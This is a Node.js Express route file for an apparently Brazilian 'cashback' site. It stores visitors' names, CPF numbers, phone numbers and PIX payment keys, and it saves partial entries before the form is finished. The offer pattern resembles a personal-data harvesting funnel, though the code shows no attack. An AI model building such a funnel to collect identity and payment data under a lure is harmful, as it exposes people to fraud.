const express = require('express');
const router = express.Router();
const { getPool, initDb, getConfig } = require('../database');
const fs = require('fs');
const path = require('path');

function renderSite(config) {
  let html = fs.readFileSync(path.join(__dirname, '../views/site.html'), 'utf8');
  // Add JSON-safe versions of string values for use in JS contexts
  const fullConfig = Object.assign({}, config);
  for (const [k, v] of Object.entries(config)) {
    fullConfig[k + '_json'] = JSON.stringify(v || '');
  }
  for (const [k, v] of Object.entries(fullConfig)) {
    html = html.replace(new RegExp('\\{\\{' + k + '\\}\\}', 'g'), v != null ? v : '');
  }
  return html;
}

router.get('/', async (req, res) => {
  try {
    await initDb();
    const config = await getConfig();
    res.send(renderSite(config));
  } catch (err) {
    console.error('[GET /]', err);
    res.status(500).send('Erro interno. Tente novamente.');
  }
});

router.post('/api/lead', express.json(), async (req, res) => {
  try {
    await initDb();
    const { nome, cpf, telefone, chave_pix, tipo_chave, fatura } = req.body || {};
    if (!nome || !cpf || !telefone || !chave_pix || !tipo_chave || !fatura) {
      return res.status(400).json({ ok: false, erro: 'Dados incompletos.' });
    }
    const faturaNum = parseFloat(String(fatura).replace(',', '.'));
    if (isNaN(faturaNum) || faturaNum <= 0) {
      return res.status(400).json({ ok: false, erro: 'Fatura inválida.' });
    }
    const config = await getConfig();
    const pct = parseFloat(config.cashback_percent || '15') / 100;
    const cashback = Math.round(faturaNum * pct * 100) / 100;
    const cpfClean = String(cpf).replace(/\D/g, '').slice(0, 11);
    const telClean = String(telefone).replace(/\D/g, '').slice(0, 11);
    const userAgent = (req.headers['user-agent'] || '').slice(0, 500);
    await getPool().query(
      `INSERT INTO leads (nome, cpf, telefone, chave_pix, tipo_chave, fatura, cashback, status, user_agent)
       VALUES ($1, $2, $3, $4, $5, $6, $7, 'novo', $8)`,
      [String(nome).slice(0, 120), cpfClean, telClean,
       String(chave_pix).slice(0, 100), String(tipo_chave).slice(0, 20),
       faturaNum, cashback, userAgent]
    );
    res.json({ ok: true, cashback });
  } catch (err) {
    console.error('[POST /api/lead]', err);
    res.status(500).json({ ok: false, erro: 'Erro ao salvar. Tente novamente.' });
  }
});

router.post('/api/lead/parcial', express.json(), async (req, res) => {
  try {
    await initDb();
    const { telefone, fatura, cashback, tipo_chave, chave_pix } = req.body || {};
    if (!telefone || !fatura) return res.status(400).json({ ok: false });
    const telClean = String(telefone).replace(/\D/g, '').slice(0, 11);
    const faturaNum = parseFloat(String(fatura));
    const cashbackNum = parseFloat(String(cashback || 0));
    const userAgent = (req.headers['user-agent'] || '').slice(0, 500);
    const { rows } = await getPool().query(
      `INSERT INTO leads (nome, cpf, telefone, chave_pix, tipo_chave, fatura, cashback, status, user_agent)
       VALUES ($1, $2, $3, $4, $5, $6, $7, 'incompleto', $8) RETURNING id`,
      ['—', '00000000000', telClean,
       String(chave_pix || tipo_chave || '').slice(0, 100),
       String(tipo_chave || '').slice(0, 20),
       faturaNum, cashbackNum, userAgent]
    );
    res.json({ ok: true, id: rows[0].id });
  } catch (err) {
    console.error('[POST /api/lead/parcial]', err);
    res.status(500).json({ ok: false });
  }
});

router.patch('/api/lead/:id/completar', express.json(), async (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    const { nome, cpf } = req.body || {};
    if (!nome || !cpf || isNaN(id)) return res.status(400).json({ ok: false, erro: 'Dados inválidos.' });
    const cpfClean = String(cpf).replace(/\D/g, '').slice(0, 11);
    const { rowCount } = await getPool().query(
      `UPDATE leads SET nome = $1, cpf = $2, status = 'novo' WHERE id = $3 AND status = 'incompleto'`,
      [String(nome).slice(0, 120), cpfClean, id]
    );
    if (rowCount === 0) return res.status(404).json({ ok: false, erro: 'Lead não encontrado.' });
    res.json({ ok: true });
  } catch (err) {
    console.error('[PATCH /api/lead/:id/completar]', err);
    res.status(500).json({ ok: false, erro: 'Erro ao completar.' });
  }
});

module.exports = router;
